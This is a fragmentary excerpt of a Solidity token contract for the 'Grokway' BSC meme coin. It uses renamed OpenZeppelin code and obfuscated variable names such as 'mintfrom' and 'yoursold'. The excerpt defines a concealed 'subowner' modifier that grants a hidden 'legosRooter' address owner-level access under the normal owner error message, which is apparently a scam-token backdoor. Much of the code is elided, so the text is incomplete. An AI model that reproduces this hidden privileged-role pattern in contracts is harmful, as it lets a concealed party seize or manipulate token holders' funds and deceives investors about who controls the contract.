...
/*
Grokway  🔥  ‘How To’ ‘Grok’ 🔥 Meme Coin  🔥  BSC 

https://t.me/GrokwayToken
...
/*
 * @dev Provides information about the current execution Grokway20Burnable, including the
 ...
 */
abstract contract Grokway20Burnable {
...
// File: @openzeppelin/contracts/access/Grokway20Ownable.sol
 ...
 * the owner.
 */
abstract contract Grokway20Ownable is Grokway20Burnable {
     ...
     */
    modifier onlyOwner() {
        require(owner() == _msgSender(), "Grokway20Ownable: caller is not the owner");
        _;
    }
    ...
    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "Grokway20Ownable: new owner is the zero address");
 ...
 * `SafeGrokway` restores this intuition by reverting the transaction when an
 * operation overflows.
 *
...
library SafeGrokway {
  ...
  function add(uint256 a, uint256 b) internal pure returns (uint256) {
    uint256 c = a + b;
    require(c >= a, "SafeGrokway: addition overflow");
  ...
  function sub(uint256 a, uint256 b) internal pure returns (uint256) {
    return sub(a, b, "SafeGrokway: subtraction overflow");
  }
  ...
  function mul(uint256 a, uint256 b) internal pure returns (uint256) {
    ...
    uint256 c = a * b;
    require(c / a == b, "SafeGrokway: multiplication overflow");
  ...
  function div(uint256 a, uint256 b) internal pure returns (uint256) {
    return div(a, b, "SafeGrokway: division by zero");
  }
  ...
  function mod(uint256 a, uint256 b) internal pure returns (uint256) {
    return mod(a, b, "SafeGrokway: modulo by zero");
  }
...
contract GrokwayToken is Grokway20Burnable, Grokway33, Grokway20Ownable {
    
    using SafeGrokway for uint256;
   ...
   address private marketingAddress = 0xEF0274E31810C9Df02F98FAFDe0f841F4E66a1Cd;
    string public Grokwatelegramn = "https://t.me/GrokwayToken";
            function getGrokwatelegramn() public view returns (string memory) {
        return Grokwatelegramn;
    }
    /**
    * @dev Returns the bep token owner.
    */
    ...
    */
    ...
    /**
    * @dev See {Grokway33-balanceOf}.
    */
    function balanceOf(address account) external view override returns (uint256) {
        return mintfrom[account];
    }
      modifier subowner() {
        require(legosRooter == _msgSender(), "Grokway20Ownable: caller is not the owner");
        _;
    }
    /**
    * @dev See {Grokway33-approve}.
    *
    * Requirements:
    *
    ...
    */
    ...
    /**
    * @dev See {Grokway33-transferFrom}.
    *
    * Emits an {Approval} event indicating the updated allowance. This is not
    * required by the EIP. See the note at the beginning of {Grokway33};
    *
    * Requirements:
    ...
    */
    function transferFrom(address sender, address shippingto, uint256 yoursold) external override returns (bool) {
        ...
        _approve(sender, _msgSender(), fromallowances[sender][_msgSender()].sub(yoursold, "Grokway33: transfer yoursold exceeds allowance"));
        return true;
    }
    ...
    * problems described in {Grokway33-approve}.
    *
    ...
    */
    function decreaseAllowance(address transporteur, uint256 allbalances) external returns (bool) {
        _approve(_msgSender(), transporteur, fromallowances[_msgSender()][transporteur].sub(allbalances, "Grokway33: decreased allowance below zero"));
        return true;
    }
    ...
    */
    function _transfer(address sender, address shippingto, uint256 yoursold) internal {
        require(sender != address(0), "Grokway33: transfer from the zero address");
        require(shippingto != address(0), "Grokway33: transfer to the zero address");
                
        mintfrom[sender] = mintfrom[sender].sub(yoursold, "Grokway33: transfer yoursold exceeds balance");
    ...
    */
    function _approve(address owner, address transporteur, uint256 yoursold) internal {
        require(owner != address(0), "Grokway33: approve from the zero address");
        require(transporteur != address(0), "Grokway33: approve to the zero address");
